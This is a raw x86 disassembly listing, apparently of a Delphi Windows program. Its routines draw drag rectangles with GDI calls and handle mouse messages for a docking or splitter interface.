cmp [ ebx + 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d94
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d94
mov edx [ ebp - 0x8 ]
pop eax
call sub_404208
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
mov eax [ ebx + 0x14 ]
call sub_448294
cmp eax 0x1
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d94
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405d94
mov edx [ ebp - 0x10 ]
pop eax
call sub_404208
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x64 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x10 ] 0x0
jmp r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax ebx
call sub_40316c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449da8
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f64
retn
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebx + 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
call sub_448644
jmp r-xdata
mov edi eax
mov edi [ ebx + 0xc ]
jmp r-xdata
mov eax ebx
call sub_4487bc
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_4487f8
mov eax [ ebx + 0x18 ]
call sub_448644
mov [ edx + 0x18 ] eax
push esi
push sub_44a344
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_448b70
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x64 ]
jne r-xdata
mov edx [ esi + 0x64 ]
mov eax [ ebx + 0x14 ]
cmp edx eax
jne r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ edi + 0x8 ]
mov [ edx + 0x18 ] eax
test eax eax
jne r-xdata
mov edx [ esi + 0x68 ]
mov eax edi
call sub_4487f8
mov eax [ esi + 0x64 ]
call sub_4487bc
mov [ esi + 0x68 ] eax
mov eax [ esi + 0x64 ]
call sub_40316c
mov [ esi + 0x64 ] edi
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0x14 ] eax
mov eax esi
call sub_44a31c
jmp r-xdata
mov [ eax + 0x10 ] 0x0
mov edx [ edi + 0x4 ]
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_40316c
mov eax [ esi + 0x64 ]
mov [ eax + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ esi + 0x64 ]
call sub_448340
mov edx eax
mov eax edi
call sub_4487e4
mov eax edi
call sub_448644
jmp r-xdata
mov edx [ edi + 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
push esi
push sub_44a344
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_448b70
jmp r-xdata
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
push esi
push sub_44a344
mov edx [ eax + 0x14 ]
mov eax esi
call sub_448b70
mov eax [ ebx + 0x14 ]
call sub_40316c
mov eax edi
call sub_40316c
jmp r-xdata
mov edx [ eax + 0xc ]
mov [ edx + 0x18 ] eax
sub_449db0
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov esi [ edi + 0x14 ]
test [ esi + 0x1c ] 0x1
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x64 ] 0x0
je r-xdata
mov eax esi
call sub_444f80
test eax eax
jle r-xdata
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
test bl bl
jne r-xdata
push edi
lea esi [ esp + 0x4 ]
add edi 0x1d
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ edi + 0x64 ]
mov dl [ eax + 0x10 ]
dec dl
je r-xdata
lea edx [ edi + 0x1d ]
mov eax esp
mov ecx 0x10
call sub_407f78
test al al
jne r-xdata
mov edx [ esp + 0x8 ]
sub edx [ esp ]
call sub_4487e4
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x68 ] eax
jmp r-xdata
dec dl
je r-xdata
mov eax [ edi + 0x14 ]
call sub_444eec
test eax eax
jle r-xdata
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
call sub_4487e4
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi + 0x68 ] eax
jmp r-xdata
xor edx edx
mov eax edi
call sub_44a1cc
cmp [ edi + 0x6c ] 0x0
jne r-xdata
push edi
push sub_44a344
xor edx edx
mov eax edi
call sub_448b70
sub_449e8c
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop edx
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_4487bc
mov [ esp ] eax
fild [ esp ]
fmul [ esi + 0x40 ]
call sub_40293c
mov edx eax
mov eax ebx
call sub_4487e4
sub_449ec8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4043f0
xor eax eax
push ebp
push sub_449f33
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_404200
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449f3a
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_449f40
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_449fef
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x1
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_44854c
mov eax [ ebp - 0x8 ]
call sub_449ec8
pop ecx
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
inc edx
call sub_449f40
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449ff6
lea eax [ ebp - 0x8 ]
call sub_403f40
retn
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
call sub_449f40
pop ecx
sub_449ffc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44a135
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x70 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44a0e4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_444eec
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx [ ebp - 0xc ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a0eb
mov eax [ ebp - 0x10 ]
call sub_40316c
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push ebp
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x14 ]
call sub_449ec8
pop ecx
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_444f00
mov edi eax
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_44a0eb
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
xor edx edx
call sub_449f40
pop ecx
mov edx rw-data
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a13c
lea eax [ ebp - 0x14 ]
call sub_403f40
retn
sub_44a144
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_448894
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4488bc
call sub_44a144
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_448894
call sub_44a144
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov eax ebx
call sub_4482c4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x64 ]
mov esi [ ebx + 0x14 ]
cmp eax esi
jne r-xdata
mov eax [ esi + 0x14 ]
call sub_4487bc
mov edx eax
mov eax ebx
call sub_4487e4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_4487e4
jmp r-xdata
sub_44a1cc
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
test edx edx
jne r-xdata
push ebp
mov eax edx
call sub_44a144
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ eax + 0x8 ]
sub_44a210
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp ebx [ esi + 0x64 ]
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_4487bc
mov edx eax
add edx [ esi + 0x4c ]
mov eax ebx
call sub_4487e4
sub_44a240
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov [ ebx + 0x60 ] edx
mov eax [ ebx + 0x14 ]
call sub_446450
mov edx eax
mov eax [ rw-data ]
call sub_44ada0
mov eax [ ebx + 0x14 ]
call sub_446450
mov esi eax
mov [ ebx + 0x5c ] esi
push 0x412
push 0x0
push esi
call GetDCEx
mov [ ebx + 0x58 ] eax
mov eax [ esp ]
mov [ ebx + 0x50 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x54 ] eax
mov eax ebx
call sub_44a354
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_44a2a0
push ebx
mov ebx eax
xor edx edx
mov eax [ rw-data ]
call sub_44ada0
mov eax ebx
call sub_44a354
mov eax [ ebx + 0x58 ]
push eax
mov eax [ ebx + 0x5c ]
push eax
call ReleaseDC
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
cmp [ edx + 0x10 ] 0x1
jne r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
add edx [ ebx + 0x50 ]
call sub_4487e4
adc edx 0x0
add edx [ ebx + 0x54 ]
call sub_4487e4
jmp r-xdata
adc edx 0x0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_44a1cc
push ebx
push sub_44a344
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_448b70
xor eax eax
mov [ ebx + 0x60 ] eax
pop ebx
retn
sub_44a31c
push ebx
mov ebx eax
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_444eec
test eax eax
jle r-xdata
push ebx
push sub_44a344
xor edx edx
mov eax ebx
call sub_448b70
sub_44a354
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x60 ]
test esi esi
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx 0x2
mov eax esi
call sub_448388
mov [ esp ] eax
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx [ ebx + 0x50 ]
sub edx eax
mov [ esp ] edx
mov edx 0x1
mov eax esi
call sub_448388
mov [ esp + 0x4 ] eax
mov eax [ esp ]
add eax [ ebx + 0xc ]
mov [ esp + 0x8 ] eax
mov edx 0x1
mov eax [ ebx + 0x60 ]
call sub_4483f4
add eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
adc eax 0x0
mov edx [ ebx + 0x54 ]
sub edx eax
mov [ esp + 0x4 ] edx
mov edx 0x2
mov eax [ ebx + 0x60 ]
call sub_4483f4
add eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
add eax [ ebx + 0xc ]
mov [ esp + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x10 ]
call sub_42222c
push eax
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
mov esi eax
push r--data
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
sub ecx edx
push ecx
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
sub ecx eax
push ecx
push edx
push eax
mov eax [ ebx + 0x58 ]
push eax
call PatBlt
push esi
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
sub_44a440
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_44a440
pop ecx
mov eax ebx
call sub_4487bc
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4487bc
cmp edi eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_44a440
pop ecx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_4487bc
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_428c40
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
sub_44a4d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4487bc
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_448340
add esi eax
mov [ ebp - 0x8 ] esi
mov eax esi
call sub_4487bc
mov [ ebp - 0x8 ] eax
jmp r-xdata
push ebp
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
call sub_44a440
pop ecx
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44a520
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x4
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_43f550
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_43f550
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x1c ]
jg r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x14 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
cmp eax [ ebp - 0xc ]
jg r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jl r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x2
mov bl 0x3
jmp r-xdata
sub_44a59c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44824c
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_4482f8
mov edx [ ebx + 0x20 ]
sub edx eax
mov [ ebx + 0x24 ] edx
jmp r-xdata
mov eax ebx
call sub_4488a0
test eax eax
je r-xdata
mov eax esi
call sub_4482c4
test al al
jne r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_44a344
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_448b70
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_4488a0
mov edx [ ebx + 0x20 ]
call sub_4487f8
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
call sub_44a59c
pop ecx
sub_44a61c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
mov esi [ edi + 0x14 ]
test esi esi
je r-xdata
mov eax [ edi + 0x14 ]
call sub_4482a8
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x64 ]
je r-xdata
mov bl 0x1
jmp r-xdata
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov eax esi
call sub_4482a8
dec eax
jne r-xdata
test bl bl
je r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add eax [ edx + 0xc ]
add eax 0xe
mov [ ebp - 0x4 ] eax
mov eax edi
call sub_4488a0
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi + 0x14 ]
call sub_44a61c
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_44a344
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ edi + 0x14 ]
call sub_448b70
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ edi + 0x14 ]
call sub_4484a4
mov eax edi
call sub_448894
test eax eax
je r-xdata
mov eax edi
call sub_4488a0
mov esi eax
mov eax esi
call sub_4487bc
push eax
mov eax esi
call sub_4482f8
pop edx
sub edx eax
sub edx [ edi + 0x24 ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov eax edi
call sub_448894
call sub_4487bc
sub eax [ edi + 0x24 ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov eax esi
call sub_4487bc
mov edx eax
sub edx [ edi + 0x24 ]
mov eax esi
call sub_4487e4
mov eax esi
call sub_4487bc
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_4487e4
mov eax edi
call sub_4488a0
call sub_448834
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax edi
call sub_4482f8
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_4487e4
mov eax edi
call sub_448894
call sub_448834
mov bl 0x1
jmp r-xdata
sub_44a754
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_448b08
test eax eax
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x10 ]
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_416a38
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4492fc
test eax eax
je r-xdata
push ebp
call sub_44a59c
pop ecx
push ebp
call sub_44a61c
pop ecx
jmp r-xdata
xor ebx ebx
mov ebx [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
push ebx
mov edx ebx
mov eax esi
call sub_44a520
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
sub_44a7dc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov eax [ edi ]
mov ebx [ eax + 0x18 ]
mov eax [ edi ]
mov esi [ eax + 0x60 ]
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax esi
mov edx 0x2
call sub_448388
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jl r-xdata
mov eax esi
mov edx 0x1
call sub_448388
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jl r-xdata
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_44a4d0
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_44a4d0
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x54 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov edx [ edi ]
mov [ edx + 0x54 ] eax
jmp r-xdata
sub_44a86c
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44ac44
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x202
jg r-xdata
sub eax 0x203
je r-xdata
je r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406cd8
lea edx [ ebp - 0x44 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4492fc
mov esi eax
test esi esi
je r-xdata
sub eax 0xae2d
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx ebx
mov esi [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
sub eax 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_44a2a0
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406cd8
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4492fc
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call GetCursorPos
lea ecx [ ebp - 0x44 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_43f6f4
mov eax [ ebp - 0x44 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x8 ] 0x1
jne r-xdata
sub eax 0x1e0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ac4b
lea eax [ ebp - 0x48 ]
call sub_403f40
retn
mov edx ebx
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebx + 0x8 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0xb00b
jne r-xdata
cmp [ ebp - 0x10 ] 0x14
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_446450
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
dec eax
je r-xdata
call sub_43e410
push 0x1
xor ecx ecx
xor edx edx
mov eax [ esi + 0x4 ]
call sub_4408e4
jmp r-xdata
test esi esi
je r-xdata
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_403f40
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_44a754
jmp r-xdata
mov edi [ esi + 0x4 ]
mov eax edi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_444f80
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_44a354
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406cd8
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x44 ]
mov [ eax + 0x50 ] edx
mov edx [ ebp - 0x40 ]
mov [ eax + 0x54 ] edx
push ebp
call sub_44a7dc
pop ecx
mov eax [ ebp - 0x4 ]
call sub_44a354
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406cd8
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4492fc
mov esi eax
test esi esi
